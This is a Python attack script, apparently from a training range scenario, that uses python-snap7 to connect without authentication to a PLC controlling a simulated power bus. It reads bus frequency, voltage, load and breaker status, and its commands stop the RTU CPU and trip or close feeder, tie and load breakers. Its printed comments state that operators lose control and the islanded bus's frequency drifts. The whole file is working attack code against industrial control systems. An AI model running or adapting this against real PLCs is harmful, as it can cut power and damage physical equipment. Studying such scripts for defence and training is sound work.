#!/usr/bin/env python3
"""Scenario 7, S7comm against plc-power. python-snap7, no authentication.

  s7_attack.py read                 read DB1 (bus values, breaker status)
  s7_attack.py stop                 stop the RTU CPU
  s7_attack.py start                start it again
  s7_attack.py trip  <feeder|tie|load>   open a breaker
  s7_attack.py close <feeder|tie|load>   close a breaker
"""
import socket
import struct
import sys

import snap7

import targets as T

# from plc-power/s7map.py
BREAKER_STATUS, BREAKER_CMD = 6, 7
CMD = {"feeder": (0, 1), "tie": (2, 3), "load": (4, 5)}  # (close_bit, open_bit)

c = snap7.client.Client()
c.connect(socket.gethostbyname(T.guard(T.PLC_POWER)), 0, 1, T.S7_PORT)


def read():
    db = c.db_read(1, 0, 24)
    st = db[BREAKER_STATUS]
    print("cpu        :", c.get_cpu_state())
    print("freq  Hz   :", struct.unpack_from(">h", db, 0)[0] / 100.0)
    print("volt  kV   :", struct.unpack_from(">h", db, 2)[0] / 10.0)
    print("load  MW   :", struct.unpack_from(">h", db, 4)[0] / 10.0)
    print("breakers   : feeder=%d tie=%d load=%d"
          % (st & 1, (st >> 1) & 1, (st >> 2) & 1))


def stop():
    print("[*] S7 stop-CPU")
    c.plc_stop()
    print("    RTU is in STOP. Operators keep their screen but lose control.")


def start():
    c.plc_hot_start()
    print("[*] RTU started")


def _breaker(open_it):
    which = sys.argv[2]
    close_bit, open_bit = CMD[which]
    bit = open_bit if open_it else close_bit
    print(f"[*] writing BREAKER_CMD bit {bit} ({'open' if open_it else 'close'} {which})")
    c.db_write(1, BREAKER_CMD, bytearray([1 << bit]))
    print("    opening the feeder breaker islands the bus; the frequency then")
    print("    walks off on the generation/load imbalance.")


if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "read"
    {"read": read, "stop": stop, "start": start,
     "trip": lambda: _breaker(True), "close": lambda: _breaker(False),
     }.get(cmd, lambda: print(__doc__))()
